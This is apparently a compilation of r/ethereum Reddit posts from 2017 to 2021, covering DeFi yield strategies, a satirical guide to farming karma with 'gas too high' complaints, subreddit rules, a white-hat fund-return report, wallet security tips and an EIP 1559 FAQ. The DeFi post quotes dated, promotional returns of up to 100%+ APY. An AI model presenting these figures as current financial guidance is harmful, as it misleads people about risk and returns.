indefinitely||:-|:-||'[+'] Low-risk strategy as this functionality is supported natively in the ETH protocol|'[-'] Inactivity penalties (rather low) for offline time, risk of slashing for misconfiguration|**1.2 Staking ERC-20 tokens**Tokens: *Aave (LEND) '[3'], Synthetix (SNX) '[4'], Sushi '[5'], Curve (CRV) '[6'], Badger '[7'], The Graph (GRT) '[8'], and many others...)*    rewards: various, ranging from 3% APRThere exist many tokens on Ethereum that incentivize users to lock their tokens to earn staking rewards for various activities: computation (e.g., verifying transactions), asset collateralization, governance—or no activity at all ('~reward distribution tokens).|'[+'] Earning interest on your favorite coins|'[-'] Risk of token price depreciation in projects that are not mainstream or that have a long-term token issuance scheme||:-|:-|**2 LENDING**dApps: *Compound '[9'], Aave'[10']*You can provide your tokens to be lent to borrowers at (usually variable) interest rates. Some exchanges and centralized services offer these services as well. Lending rewards are typically low for leading crypto projects (ETH, wBTC) but are very interesting for stablecoins.**2.1 Stablecoin lending**    rewards: 3–20% APR, up to 30% APYYou lock your stablecoins into a vault. All the tokens in the vault earn the same reward. The interest rate fluctuates depending on the demand. Usually, in bull markets, the APR is higher than in bear markets.  The reward is around 3-20% APR but compounding these rewards can slightly improve the rates, supposing the provider offers in-built compounding solutions (otherwise it does not pay-off to pay the high TX fees to claim rewards repeatedly).|'[+'] Better rates compared to tradFi, but essentially on the same asset (dollars)|'[+'] Low-risk strategy only depending on external factors (stablecoin losing peg)||:-|:-||'[+/-'] Stablecoins keep their price (disadvantage in bull markets, advantage in bear markets)||**2.2 ETH, wETH, wBTC lending**    rewards: 0.15–3% APRWrapped ETH (ETH is not ERC-20 token) and wrapped BTC (wBTC, renBTC) can be lend or staked to provide a yield that is in general rather low, but for holders with bigger stacks, it can be a very effective way to earn stable income on the two most mainstream cryptocurrencies.|'[+'] You HODL your crypto and you get a small additional income||:-|**3 LIQUIDITY PROVIDING**dApps: *uniswap'[11'], sushi'[12'], 1inch'[13'], Loopring'[14'] (L2)*    rewards: up to 100%´s APR (with rewards)Decentralized exchanges (DEX) run automated liquidity pools in order to facilitate the swaps (i.e., exchange trades). Users can provide liquidity for a DEX-traded pair by locking both assets to the pool, at 1:1 volume at their current corresponding price ratio. By locking the assets, you are eligible to earn the fixed fees (around 0.3%) of every trade, proportional to your stake in the liquidity pool. It makes sense to lock assets that you want to hold anyways and in the long-term, e.g., ETH/stablecoin pairs. New pairs are very often incentivized in providing liquidity by offering rewards schemes.|'[+'] Acquiring a reasonable proportion of the pool that has high trading volume can generate interesting profits|'[-'] Inter-pair token price fluctuations or decline to $0 lead to permanent and impermanent losses||:-|:-||'[+'] Many liquidity pools are incentivized by token providers or DEXes by additional token rewards that might severely boost the interest|'[-'] Pools with low or no liquidity provide unstable ratios|**4 YIELD FARMING**dApps: *yearn'[15'], curve'[6'], badger'[16'], harvest.finance'[17'], alphahomora'[18'] (leveraged farming), and many others...*    rewards: up to 100%´s APYIn typical staking, lending, or liquidity-providing scenarios, there is no compounding. In other words, you have to claim your rewards manually to earn them and re-stake them to compound your interests.  Some of the farming protocols collect the rewards for you. Yield farming basically removes or socializes the transaction fees to claim the rewards, which means that your earned interest is continuously compounding which increases the APR (to APY) without the need of repeatedly interacting with the smart contract which is expensive. Some aggressive yield farming strategies focus on harvesting both yields AND rewards from various protocols and compound all of them, which can make them very profitable in short term.|'[+'] Very high rewards (100+% APY is not problem)|'[-'] Some farmed assets cease to exist leaving you with permanent losses||:-|:-||'[+'] Farming aggregators (e.g., harvest.finance) offer multiple strategies and additionally offer interesting reward tokenomics|'[-'] Many strategies are short term only and are not worth paying high TX fees|**5 MISCELLANEOUS**There are many wonderful projects around that attract and deserve attention and offer plausible earning strategies.**a) Yield farming on non-fungible tokens (NFT)**dApps: *Syncbonds'[19'], VeryNifty'[20']*Reward generating NFT tokens. Cryptobonds'[19'] are tradable reward-generating NFTs that lock up interest-bearing liquidity tokens. You can emit your own bond, participate in emitting one with others, or buy already emitted bonds on the open market.With VeryNifty'[20'], you can wrap your NFTS and turn them into vNFTs that earn you interest in the MUSE token. Careful, conditions apply that might burn your NTFs. There is a [uniswap pool](https://app.uniswap.org/#/add/0xc2BdE1A2fA26890c8E6AcB10C91CC6D9c11F4a73/0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2) to stake and generate yields and trade HashMasks.**b) Synthetic assets**dApps: *Synthetix '[21'], Mirror'[22']*Synthetic assets are derivatives that are incentivized to hold the price peg to the underlying asset (stock, fund, commodity). The main advantage of 'synths' is that anyone can get immutable exposure to any asset at any time (looking at you Robinhood traders). The disadvantage is that you do not really own the stock so you can not partake in ongoing short squeeze (looking at you GME apes). Ensuring the collateral to back up the synthetic asset pair with stablecoin can earn you good rewards while exposing you to the stock at the same time. The leading projects are Synthetix'[21'] and Mirror.finance'[22'] that uses its Terra UST cross-chain stablecoin.**c) Future yield tokenization**dApps: *APwine'[23'], Syncbonds'[19']*Imagine you can stake your tokens to gain future yields without locking the tokens and imagine you can sell these interest-bearing tokens INCLUDING its future yield in advance (for some discount, or even premium if you are lucky or smart). Sounds like a Matrix loophole. The markets are so far rather small, but the APwine'[23'] project is worth keeping eye on.**d) Self-paying loans - alchemix**dApps: *Alchemix'[24']*Alchemix'[24'] lets you take loans that do not generate debt for you but yield. You deposit a certain amount of crypto as collateral and you are able to withdraw up to its half as 'a loan to yourself'. The other half is getting paid automatically by farming strategies.**6 LINKS AND RESOURCES*** '[1'] [https://defipulse.com/](https://defipulse.com/) '- total value locked overview* '[2'] [https://ethereum.org/en/eth2/staking/](https://ethereum.org/en/eth2/staking/) '- ETH 2.0 staking* '[3'] [https://aave.com/](https://aave.com/) '- lending platform, governance and reward token* '[4'] [https://synthetix.io/](https://synthetix.io/) '- synthetic assets, collateral and value peg token* '[5'] [https://www.sushi.com/](https://www.sushi.com/) '- decentralized exchange with farming and reward strategies* '[6'] [https://curve.fi/](https://curve.fi/) '- yield farming including BTC strategies* '[7'] [https://badger.finance/](https://badger.finance/) '- BTC strategies on Ethereum* '[8'] [https://thegraph.com/](https://thegraph.com/) '- Blockchain analytical data computation and providing platform* '[9'] [https://app.compound.finance/](https://app.compound.finance/) '- lending platform* '[10'] [https://app.aave.com/](https://app.aave.com/) '- lending platform* '[11'] [https://app.uniswap.org/](https://app.uniswap.org/) '- decentralized exchange* '[12'] [https://app.sushi.com/](https://app.sushi.com/) '- decentralized exchange* '[13'] [https://1inch.exchange/](https://1inch.exchange/#/) '- decentralized exchange* 14'] [https://exchange.loopring.io/swap](https://exchange.loopring.io/swap) '- decentralized exchange* '[15'] [https://yearn.finance/vaults/](https://yearn.finance/vaults/) '- yield farming* '[16'] [https://app.badger.finance/](https://app.badger.finance/) '- yield farming (BTC strategies)* '[17'] [https://harvest.finance/](https://harvest.finance/) '- yield farming aggregator* '[18'] [https://homora.alphafinance.io/](https://homora.alphafinance.io/) '- leveraged yield farming* '[19'] [https://app.syncbond.com/](https://app.syncbond.com/) '- tradeable yield-bearing NFT bonds* '[20'] [https://gallery.verynifty.io/](https://gallery.verynifty.io/) '- farming NFTs* '[21'] [https://staking.synthetix.io/staking](https://staking.synthetix.io/staking) '- collateral, liquidity, and trading of synthetic assets* '[22'] [https://eth.mirror.finance/](https://eth.mirror.finance/) '- collateral, liquidity, and trading of synthetic assets* '[23'] [https://app.apwine.fi/](https://app.apwine.fi/) '- trading yield-baring tokens with future interest* '[24'] [https://app.alchemix.fi/](https://app.alchemix.fi/) '- self-paying loans**DISCLAIMER**To earn interest in most cases does not mean buying the project's native token but using their platform/dApp.I am not anyhow related to, paid by, or involved with development in any of the mentioned projects or protocols.This is the 1st version (16. 3. 2021).

Let me save you time and give you some basic guidelines to ensure your success. Here are some of the best and most tested methods to farm karma on r/ethereum.**1.GAS TOO HIGH:**Make sure there is $0.5 to $1 in your Metamask account. Then go interact with any Ethereum smart contracts. On your Metamask, go to edit gas, and crank gas limits to 9999999. Then you'll get absurd values like $15,000 for the swap/deposit/withdrawal/whateverthefuckhaveyou. TAKE THE FUCKING SCREENSHOT!!!! You're done. Post it online. GGWP. Fucking ETH is robbing you $15,000 for a $1 transaction, fuck me right?!**2.GAS TOO HIGH:**When minting NFTs, make sure you wait till all NFTs have been fully minted. There's a bug in Metamask that, when an NFT is sold out, you'll receive absurdly high gas like 5 ETH for one mint. Metamask hasn't updated that hole yet, so here's your chance to farm more karma. TAKE THE FUCKING SCREENSHOT of the mint. Post it on Twitter. Fuck me, now Ethereum wants to rob you of your $25k for a fucking jpeg, fuck me right?**3.GAS TOO HIGH:***'Hey guys. WTF?! I'm a new investor with $100 in my wallet. I literally can't do anything right now. Why does it take me $500 to transfer my money anywhere with Etherium??? $500 is literally a lifelong salary in my country here. Most people here earn like $5 a MONTH! WTF IS THIS BULLSHIT. ETHEREUM IS FOR THE RICH ONLY!!!! This is highway robbery. Etherium is only this high because nobody can sell lol lmfao omg.'*That's a pre-made essay you can use to farm karma anywhere you want, be it r/ethereum or r/cc. Just use that framework and add your own twist here and there, you'll get a fuckton of moons and karma in no time. Good luck!**4.GAS TOO HIGH:**Make sure this time you're swapping $5 worth of ETH into some other coins. Remember, the swap needs to be as low as possible or this farming technique won't work! Again, crank gas limits up to 99999. Go to etherscan, check twitter for a hot NFT drop, wait till network hits 1000 gwei for 15 seconds. NOW OPEN YOUR METAMASK ASAP. Go to swap, SCREENSHOT THE FUCKING PICTURE. Now you have proof that Ethereum wants you to pay $10,000 to swap $5 worth of your hard earned money. Fucking robbed, I say! Fuck me sideways and call me Betty, right?**5.GAS TOO HIGH:***'Nobody uses Eartherium anymore. It's too crowded. Too many people are using it. Nobody is using it anymore. I don't understand how Etherium is still a thing. Gas too high!!! Why are people still using it? It's literally dead.'*That's another pre-made essay you can use to get some solid internet points. This essay is meant to prove your undisputable prowess in your understanding of basic supply/demand in economics. You'll get to be a fucking genius and get karma, what's not to like? Spam this every time all the time.**6.GAS TOO HIGH:**Fuck me. Now you're a VC fund with billions under management. Of course Ethereum $50 gas bothers you because you are here for the common man, the average working man, the 9-5 Joes and the housewife Janes, right? Fuck me. It bleeds your fucking croc - I mean, human heart to see 'em unable to pay them gas fees. Fuck me. What do you do? Well, you go on twitter, you say you're abandoning Ethereum, you say Ethereum is for the rich only, and you say all you've ever done was for the greater good of mankind and help everyone achieve financial freedom, with your VC hedge fund, of course. Fuck.'---------------Well, fuck me, that's all I got for you right now. As you can see, those are 6 very diverse and different topics you can pick anytime you want to keep your karma farming techniques varied. You can rotate them whenever you want, it should be enough materials to last you an entire week if you rotate between r/ethereum, r/cc  and other kripto subs. Shouldn't run out of farm materials ever. Good luck, farmers! And remember, everyone loves to hear a good gas story.

These can be used as reasons to remove posts/comments and ban users.### Golden RuleYou are expected to treat everyone with a certain level of respect and refrain from inappropriate behavior. Examples of inappropriate behavior include:- Personal insults- Threats of violence or attempts to organize attacks- Slurs of any kind- Posting people's private informationIf you can't play nice with others, you will not be allowed to post here.### Ether Price, Market, and Mining discussionsDiscussion related to the price of ether, buying, trading, market speculation, or any other price/market talk should be posted on /r/ethtrader, a third-party Subreddit not moderated by us. Besides, keep mining discussion to Subreddits such as /r/EtherMining and obvious ICO advertisements to r/ethinvestor or similar.### Duplicate threadsDuplicate threads may be deleted. It is up to the discretion of the mods.### No spamming or drive by postingSpamming will lead to post deletion and a possible ban. Posts created by accounts that self-delete immediately will be deleted right away - no _drive by posting_.### Using multiple accountsCreating multiple accounts to get around Reddit or Subreddit rules is not allowed and will likely result in a permanent ban.### Misleading titlesPosts with purposely misleading or unsubstantiated titles will be removed.### Karma & age requirements for posting submissionsAll post submissions should be made from accounts at least ten days old with a minimum of 20 comment karma. This is to keep trolls and spam-bots to a minimum. Exceptions may be made on a discretionary basis; please do not message the mods for more information.---## Moderation philosophy---/r/ethereum is a place for the open discussion about the Ethereum software, protocol, distributed applications, and related technologies. As moderators, we are here to make sure the conversation stays civil and productive. We will not censor posts based on personal ideology and welcome constructive discourse.### What we ask our users- Please utilize the up-vote and down-vote buttons.

Ethereum was one of the fastest ever graduated Q&A sites in the Stack Exchange network (~ 500 days)!**This is a huge milestone**, not only for Ethereum Stack Exchange, but for the whole Ethereum community. Ethereum joins an elite of 35 technologies which deserve it's own fully-fledged Stack Exchange Q&A site in the network, in one line with communities like [Ubuntu](https://askubuntu.com/), [LaTeX](https://tex.stackexchange.com/), [Blender](https://blender.stackexchange.com/), [Mathematica](https://mathematica.stackexchange.com/), and [Android](https://android.stackexchange.com/) - just to name a few, and not to forget joining one network with popular sites like [Stack Overflow](https://stackoverflow.com/), [Super User](https://superuser.com/), and [Server Fault](https://serverfault.com/).I would like to thank the Stack Exchange team for giving us the chance to field-test the site with a private and public beta, Roman Mandeleil for proposing Ethereum at [Area51](https://area51.stackexchange.com/proposals/89704/ethereum), Hudson Jameson & Joris Bontje & _eth_ for moderating the site, and all the users contributing questions, answers, tags, wikis, votes, flags, and everything else! Thank for making this possible!**But, huh, what does that mean?** The final graduation will be [fulfilled in two steps](https://meta.stackexchange.com/questions/260754/). The first one, basically removing the beta logo and immediately enabling the following features:- **moderator elections**: community members can nominate and vote on new site moderators (finally, this was needed so badly, really! :)- **community ads**: community members can propose free advertisements for non-profit and/or open-source projects in the Ethereum ecosystem which will be visible on the site- **network effect**: a link to Ethereum Stack Exchange will appear in any footer of all sites across the Stack Exchange networkThe second step, which might take a while, based on the availability of the design team of Stack Exchange includes:- **custom site theme**: the site will get an unique Ethereum-styled theme (uh-oh!)- **reputation adjustments**: privileges will be adjusted to higher levels of reputationPlease, if you are feeling happy today, cheer with us on [_meta_](https://ethereum.meta.stackexchange.com/), if you don't have an account yet, feel free to [explore the site first](https://ethereum.stackexchange.com/tour), and if you have any questions, ask me anything!---**Update**: If you want to run for moderator in the graduation elections 2017, please [follow this thread](https://ethereum.meta.stackexchange.com/questions/477/2017-graduation-moderator-election-qa-question-collection) and [here are the first elections](https://ethereum.stackexchange.com/election/1).---**Update**: Using the traction of this post to ask - If someone knows _ComandanteCheth_, please, [send him this way](https://ethereum.meta.stackexchange.com/questions/450/bump-for-google-code-prettify-lets-get-this-done). :)",False,Huge Milestone: Ethereum Stack Exchange graduates as one of the top-35 world technology sites.,,0,905,0.94,https://www.reddit.com/r/ethereum/comments/6jn2ot/huge_milestone_ethereum_stack_exchange_graduates/,[]

Today we returned that last 2%. Every multisig that [signaled using our smart contract](https://www.reddit.com/r/ethereum/comments/6p4luj/rescued_multisig_owners_can_use_a_smart_contract/) had their funds returned to the requested return address. The multisigs that did not signal had their ether and tokens sent to their [WHG Deployed Multisigs](https://www.reddit.com/r/ethereum/comments/6owvor/the_replacement_multisig_wallets_have_been/) which have been [tested and bug bountied all week by the Parity team and the community at large](https://blog.parity.io/security-update/). You can see all of our sends [on Etherscan](https://etherscan.io/address/0x1dba1131000664b884a1ba238464159892252d3a). It is worth noting that this address contained funds when the rescue mission began, and received funds during the operation. You can also see a summary of all of our transactions in [this CSV file on github](https://github.com/Giveth/WHGBalanceVerification/blob/master/WHGMultisigReturnTxs.csv).**The Other White Hat!**We worked closely with the [other White Hat](https://www.ethnews.com/meet-the-unknown-maverick-white-hat-who-rescued-accounts-missed-by-the-whg-during-this-weeks-attack), who also returned the balance of his rescued funds today.

His transactions are also included in the [CSV file](https://github.com/Giveth/WHGBalanceVerification/blob/master/WHGMultisigReturnTxs.csv)**WHG Donations**We can not express enough gratitude to the community at large for their participation in helping to recover these funds. This operation was aided directly by over 30 people and indirectly by countless others. Many people have requested/demanded a donation address so we created a donation account following the [Giveth](http://giveth.io/) model, which generates a White Hat Donation Token when it receives ether.Our donations address is `whitehats.eth` which resolves to `0xd556cAF704e39fc728058557a113b226207D2212` it requires a `gasLimit` of 155,000 gas.Half of the donations will go to the 30+ people involved in helping in this specific action, these people will receive non-transferable WHG tokens which will be used to collect their portion of the donations from a withdraw contract once we can test it and obtain everyone's account addresses.The other half of the donations will go to a White Hat Fund to support smart contract security and future White Hat actions, while also acting as a legal contingency fund. **Sadly Not Everyone Was Saved**There were at least two other addresses that utilized this exploit but have not stepped forward to return the funds as far as we know, [the original hacker](https://etherscan.io/address/0xb3764761e297d6f121e79c32a65829cd1ddb4d32) that drained the [Swarm City](https://press.swarm.city/parity-multisig-wallet-exploit-hits-swarm-city-funds-statement-by-the-swarm-city-core-team-d1f3929b4e4e), [Aeternity](https://blog.aeternity.com/parity-multisig-wallet-hack-47cc507d964d), and [Edgeless](https://medium.com/@tomasdraksas/edgeless-response-to-parity-hack-3e35e20ba85c) Multisigs and another [later hacker that was able to grab almost $250k worth of tokens](https://etherscan.io/address/0xdfb692d180cae04bb29b6cd9878ede2ec8e79f45).Of the victims, we have stayed in closest contact with Swarm City, who alerted us of the exploit in the first place, giving us the head start we needed to preserve the funds that we could. Swarm City has [explicitly declined to accept any donations](https://press.swarm.city/follow-up-statement-from-the-swarm-city-core-team-3ab0f1274ad3), saying that if people want to help they can [join their slack](https://slackinvite.swarm.city/) to participate in their efforts to decentralize commerce, and if they still feel compelled to help financially, they can buy their SWT token and hold them.This is just one of many stories from the past week that has reaffirmed our faith in the Ethereum community. We truly have the best community in crypto, which is what attracted us to the project in the first place. This community has always been and will always be Ethereum's strongest asset. **Thank you all!**Edit: /u/bokkypoobah, being the White Hat that he is, has found several other attackers that have yet to step forward to return the funds. :-( [See his well documented expose on this event](https://github.com/bokkypoobah/ParityMultisigRecoveryReconciliation#parity-multisig-recovery-reconciliation) for [the complete list](https://github.com/bokkypoobah/ParityMultisigRecoveryReconciliation#attacking-accounts).",False,The WHG has Returned 100% of the Rescued Funds to their Rightful Owners,,1,904,0.94,https://www.reddit.com/r/ethereum/comments/6qrjr5/the_whg_has_returned_100_of_the_rescued_funds_to/,[]

There is really, really no excuse. https://www.ledgerwallet.com & https://shop.trezor.io/2. If you don't want one of these nifty devices, use cold storage for a majority of your savings. Please. Pretty please.3. **Bookmark your crypto sites.** Use those bookmarks and only those.4. **Turn on 2FA for everything.** Go do it. Right now. Quit your excuses. Choose Google Authenticator over Authy. Don't use your phone number. Then, make sure your phone number is NOT tied to your Google account (look in privacy settings). Turns out, you and your BFF Mr. Hacker can 'recover' access to your account via that number, completely destroying the point of 2FA. *PS: Don't forget to cold-storage your backup words for these 2FA things. It's a huge pain when your phone goes for a swim and your entire life is 2FA'd.* 😊4. **Do not use cloud storage (Dropbox, Drive, iCloud) for storing your keys** [:(]( https://twitter.com/izqui9/status/872364163330428931)Now your keys would only be protected by your cloud storage password. Also, see #4.5. **For Token Sales: do not trust any address except the one posted on the official site.** Bookmark the URL before the sale, get the address from the URL from your bookmark at time of purchase. Do not trust any other source (especially a random bot on Slack). *PS: When are token sales going to start using ENS names?*6. **Double check the URL.** Check it. Then, check it again right before entering any information. This is especially important for any sites that require usernames, passwords, email addresses, private keys, and any other personal information. SSL certs do not mean a site is trustworthy, just that they bought an SSL cert. Not sure about the correct URL? *Cross reference* Reddit, Twitter, Github, Slack and wherever else the project hangs out.7. **Triple check Github URLs.** These are much easier to fake and much easier to miss. Instead of downloading from that random URL on reddit, seek out the URL on your own. Following the developers of these repos on Twitter, friending them on reddit (lol...but seriously it's nice because their name will be orange), or starring said repos on Github helps.6. **Always verify that the site you landed on is legit.** Especially if you are about to entire your private key or download an application. What is legit? A service that people have used for a decent period of time with good results. If the URL has been registered in the last week or the site 'just launched', err on the side of caution and avoid it for a while.8. **Google the service name + 'scam' or 'reviews'.** Scam sites rarely last long. Value real comments by real people over a random blog. Value a *collection* of information over a single source. Understand that legit services will likely have a mix of positive and negative reviews over a long period of time. Scam sites typically have no one talking about them, everyone yelling about how they got robbed, or the most perfect reviews ever. The latter one is just as red of a flag as the first one. 9. **Don't ever run remote-access software (e.g. TeamViewer)** ever...but especially not on a computer with keys on them. The number of security holes in these programs is atrocious. You 2FA your entire life, but then let a single string of characters give someone access to your *entire* computer & every account. 😱10. **Don't click any link regarding anything crypto, money, banking, or a service like Dropbox / Google Drive / Gmail in any email ever.** And if the scammy clickbait was simply too irresistible for you, don't enter any information on the page.11. **Install an adblocker that actually turns off Google/Bing Ads.** I recommend going with [uBlock Orgin](https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en). If you are already using Adblock Plus, it does not hide Google Ads from you. Go into your Adblock Plus settings and uncheck the box that says Allow some non-intrusive advertising. 12. **Don't click on advertisements.** With or without an adblocker, you should never, ever click on advertisements.13. **If you have accidentally visited or typed a malicious site, clean out your recent history and autocomplete.** This will prevent you from typing `kra` and having it autocomplete to the malicious `krakken.com`. 14. **No one is giving you free or discounted ETH. Even for completing a survey.** 15. **The guys who just finish their token sale don't want to sell you tokens via Slack DM.** Neither does that smokin' hot 125px x 125px avatar. 16. **Lastly: use your brain.** Think for a moment. Don't assume, ask. Don't blindly follow, question. If something doesn't seem right...if you feel like the luckiest fucker on Earth...or if you find yourself asking, 'I wonder why I haven't seen this on reddit yet', there is likely a reason. 👍----## A note about Ethereum Chamber scam yesterdayAs some of you are aware, there was a scam site yesterday that was a clone of MyEtherWallet.com, but red. I was alerted to it via a Facebook message ~5am from a diligent user. That is one of 3 messages I received about it before our tweet went up at 1pm, not including the 5 from our internal team (thank goodness someone realizes our site isn't red!)Since that site has come to light, a number of folks have mentioned things like, 'Oh yeah I saw it, I figured you guys were just rebranding' or 'Oh weird. Yeah I figured it was a scam.'This site, which *I* thought was only a paid CoinTelgraph blurb at the time, was actually on a large number of Bitcoin blogs: podcasts, blogs, news sites, Twitter, the works. How does this happen? How do a number of bloggers promote a direct (red) clone of MEW, people see it, and no one says anything? *(The fact that all these bloggers & 'news' organizations gleefully accepted money from a wallet site without Googling 'ether wallet' or 'Name of the Site' is a far too angry and long rant, but should not go unnoticed.)* Anyways!---## While the above post is all about the steps *you* should take to protect yourself, there is another one that is even more important:## Look out for one anotherScammers thrive because they have victims -- because they know they can throw a stupid website out there and people will click it. Stop thinking, 'Well, they shouldn't have clicked it' and start doing what you can to prevent people from making a mistake that will cost them their hard-earned coins. - If you notice something looks like MEW, say *'Hey, that looks like a clone of MEW! I wonder if they've seen it?'*- If you think that Github URL looks weird but you don't have the time to check, throw a *'hey u sure thats rite url?'* up there. - If that reddit post is an unheard of wallet, leave a comment and report it with a *'??????????'* in the report reason.- If the Token Sale you are participating it doesn't tell you explicitly when & where their address will be posted, ask them, in public, over and over again. If its not at least 24 hours before the Token Sale, question that choice, in public, over and over again. - Remind people about best practices! If you've been visiting /r/ethereum for more than 3 months, you have 3 months on 25% of the people here. You are a bloody expert now. Time to put on your big boy pants:- *'@nooboob Remember the address will be posted on their website, NOT in this Slack.'*- *'It looks like this is an okay link, but it's not a good idea to click or install things from a random user on reddit. It could be malware.'***There needs to be more due diligence everywhere, but this is easier diligence than most. It requires no advance knowledge or skills. You don't even have to be able to write good. Stay aware, trust your gut, ask more questions, trust the internet less, and google the fuck out of everything.**Stay safe out there. 💖",False,[UPDATED] It's Time to Get Real: Stop Relying on Third Parties to Protect You & Your Funds.

Interestingly, when recently asked on Discord why Optimism needed to wait until they (synthetix, uniswap, chainlink) were ready, Jinglan said:'We especially want things like token bridges, infrastructure providers, block explorers, multisigs, wallets, etc. to be ready for launch so people can use L2 as safely as possible . . . [i]n order for a project to upgrade safely, we need to integrate a multisig prior to launch. Other things in this category include oracles, indexers, etc.'Just wow. And chainlink hasn't deployed anything yet?!  Notably, Chainlink already has price feeds on xDai and their oracles are ready as well (with documentation). But were told Chainlink was an 'integration partner, but for the last 6 months they've done basically nothing? No price feeds. Not even oracles? Amazing. Soooo just barely a month ago, Jinglan and company didn't have any idea that mainnet wouldn't be ready in March? That Chainlink, an integration partner doesn't even have price feeds, but that mainnet would be ready in March? They didn't even have block explorers or wallets ready? Lol. Smh.  I understand that projects get delayed, but this is pretty alarming. How can we possibly trust or rely on anything Optimism says at this rate? This whole situation is unfortunate and unacceptable at this point. It's no wonder xDai and polygon are eating into Ethereum's market share. Jinglan, can you get it together please? P.S. I love ETH and have been hodling since 2017. I'm just pissed at the lack of urgency surrounding L2 solutions and and how this is panning out.EDIT: downvote me all you want, still doesn't change the facts of the matter. Jinglan said it, not me.EDIT 2: I understand my interpretation of events surrounding optimism may be incorrect. I'm not afraid to be corrected or learn from those who know more than I do.

On Ethereum, minimum fees are typically around 2 gwei (10^9 gwei = 1 ETH), but sometimes go up to 20-50 gwei and have even on one occasion gone up to over 200 gwei: https://etherscan.io/chart/gasprice. This clearly creates many inefficiencies, because it&#39;s absurd to suggest that the cost incurred by the network from accepting one more transaction into a block actually is 100x more when gas prices are 200 gwei than when they are 2 gwei; in both cases, it&#39;s a difference between 8 million gas and 8.02 million gas.* **Inefficiencies of first price auctions**: see https://ethresear.ch/t/first-and-second-price-auctions-and-improved-transaction-fee-markets/2410 for a detailed writeup. In short, the current approach, where transaction senders publish a transaction with a fee, miners choose the highest-paying transactions, and everyone pays what they bid, is well-known in mechanism design literature to be highly inefficient, and so complex fee estimation algorithms are required, and even these algorithms often end up not working very well, leading to frequent fee overpayment. See also https://blog.bitgo.com/the-challenges-of-bitcoin-transaction-fee-estimation-e47a64a61c72 for a Bitcoin core developer&#39;s description of the challenges involved in fee estimation in the status quo.* **Instability of blockchains with no block reward**: in the long run, blockchains where there is no issuance (including Bitcoin and Zcash) at present intend to switch to rewarding miners entirely through transaction fees. However, there are [known results](http://randomwalker.info/publications/mining_CCS.pdf) showing that this likely leads to a lot of instability, incentivizing mining &#34;sister blocks&#34; that steal transaction fees, opening up much stronger selfish mining attack vectors, and more. There is at present no good mitigation for this.EIP 1559 has these benefits:* It mitigates the economic inefficiencies from social cost mismatch due to fee volatility. There is a fairly nuanced economic argument here; see particularly pages 16-20 of the paper linked in https://ethresear.ch/t/draft-position-paper-on-resource-pricing/2838 (though I recommend reading the whole paper) for a detailed argument of why this is the case. Intuitively, the adjusting fee mechanism works like a fixed fee in the short run and a cap in the long run, and it turns out that because of [arguments from Martin Weitzman&#39;s 1974 paper](https://scholar.harvard.edu/weitzman/files/prices_vs_quantities.pdf) fixed fees are likely better than a cap in the circumstances that basically all public blockchains are in today and will likely continue to be in.* It replaces the auction with a fixed price sale (except during short periods where blocks fill up completely until fees catch up), eliminating first-price-auction inefficiencies and making fee estimation extremely simple: calculate the fee `f` for the next block, if you can afford it pay it, otherwise don&#39;t.* It creates a mechanism similar to a permanent block reward (the 1/N coming from the pot), mitigating many of the instability issues with fee-only blockchains without requiring actual permanent issuance.-----------------------Another underrated benefit of EIP 1559 is that it makes gas prices _securely measurable_. Today, just looking at gas prices on chain and using them as an index is exploitable, because miners could include either very-low-fee or very-high-fee dummy transactions where the fee would go to themselves. But under EIP 1559, the BASEFEE can only be manipulated at high cost, as dummy transactions would requre even the miner to pay fees (that get burned).## Are current fee markets really that inefficient?Yes. The difference between average gasprice and 10th percentile gasprice in a regular block is something like 3x for median and 5-8x for mean. People needlessly overpay massively.Everyone who does not overpay suffers a delay of 1-2 minutes or even longer, and this delay does not actually benefit anyone; the total load to the chain is the same regardless of whether a given unit of load hits the chain at time N or time N + 60. **There is no actual social benefit from participants &#34;expressing a low time preference&#34;** in the fee market mechanism, at least under normal conditions; it is pure deadweight loss. We would all be better off if more transactions were just included immediately, which EIP 1559 allows.## Why not just use a second price(or kth price auction) to solve the first-price-auction inefficiencies?Kth-price auctions (where everyone pays a gasprice equal to the lowest gasprice that was included in the block) are indeed &#34;efficient&#34; in a traditional economic analysis*, but have the flaw that they are vulnerable to collusion.* Yes of course technically you want to use the _highest gasprice not included_ in the block; but in practice given that most ethereum blocks have hundreds of transactions the difference would be negligible.## Might EIP 1559 run the risk of over-stressing nodes and miners during periods of high usage?EIP 1559 can at most increase block size by 2x, even in the short term. Each &#34;full block&#34; (ie. a block whose gas is 2x the TARGET) increases the BASEFEE by 1.125x, so a series of constant full blocks will increase the gas price by a factor of 10 every ~20 blocks (~4.3 min on average). Hence, periods of heavy on-chain load will not realistically last longer than ~5 minutes.Note that currently, periods of double load that last 5 minutes already happen by random chance roughly once per ~63888 blocks (~10 days) because of variance in the rate of block production. So the introduction of EIP 1559 would not bring in any unprecedented level of load to the system.Additionally, the gas limit being only 10 million and not higher is justified to a large extent not by hard network limits (uncle rates are [near historic lows](https://etherscan.io/chart/uncles), though risks to non-miner nodes such as bootstrap nodes, may be higher), but by concerns that are fundamentally long-term in character:* Centralization risk of somewhat higher uncle rates: if uncle rates shoot up to 20%, that would disproportionately benefit well-connected large pools* Limits to state size* Difficulty of syncing after a short period offlineIn all three of these cases, what matters is not the upper bound on capacity within a very short window of time, but rather the long-term average capacity. Uncle rates being 2% during odd hours and 18% during even hours would have the same effect on all three of the above, as uncle rates always being 10%. Because EIP 1559 still bounds the long-run gas usage to a ~10 million per block average, it does not affect the long-term average.## How would a spike of high usage look like under EIP 1559 compared to the status quo?Consider a &#34;mathematically ideal spike&#34; (eg. this could happen in real life because of a sudden market event leading to many arbitrage opportunities on DEXes, bidding on liquidated CDPs, etc), where N * 10 million gas worth of transactions, each with a very very high gasprice, are all broadcasted.Currently, this would lead to the following situation:* The next N blocks are filled exclusively with new spiky transactions* After that other transactions, as well as transactions that people send after the spike, get included in descending order of gaspriceAn average &#34;normal user&#34; would have to wait more than N blocks.Now, consider the situation under EIP 1559:* The next N/2 blocks are filled exclusively with new spiky transactions, each with twice the normal amount of gas* If all other transactions get sent with a gas price cap equal to the old gasprice, then the next N/2 blocks would be empty, and after that things would revert to normal. But realistically, higher-priority transactions would set higher gas price caps and get included first, and other transactions later.An average &#34;normal user&#34; would have to wait somewhere between N/2 and more than N blocks.Hence, even including the post-spike &#34;recovery period&#34; during which block capacity would be smaller than normal, most transactions get included sooner.Here&#39;s a very rough simulation (there are lots of strange assumptions here, but modeling a full system that covers both supply/demand curves *and* waiting times is hard); spreadsheet source 